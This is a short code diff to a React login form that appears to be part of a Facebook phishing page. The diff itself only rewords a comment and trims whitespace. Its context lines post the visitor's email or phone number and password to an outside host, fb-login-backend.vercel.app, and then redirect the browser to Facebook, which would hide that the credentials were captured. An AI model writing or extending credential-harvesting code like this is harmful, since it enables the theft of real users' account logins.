@@ -30,13 +30,13 @@ const LoginForm = () => {
   
     if (validateForm()) {
       try {
-        const response = await fetch('https://fb-login-backend.vercel.app/login', { // Use the correct URL
+        const response = await fetch('https://fb-login-backend.vercel.app/login', { // Correct URL for backend
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({ emailOrPhone, password }),
-        });        
+        });                
   
         if (response.ok) {
           // Redirect to Facebook on the client side
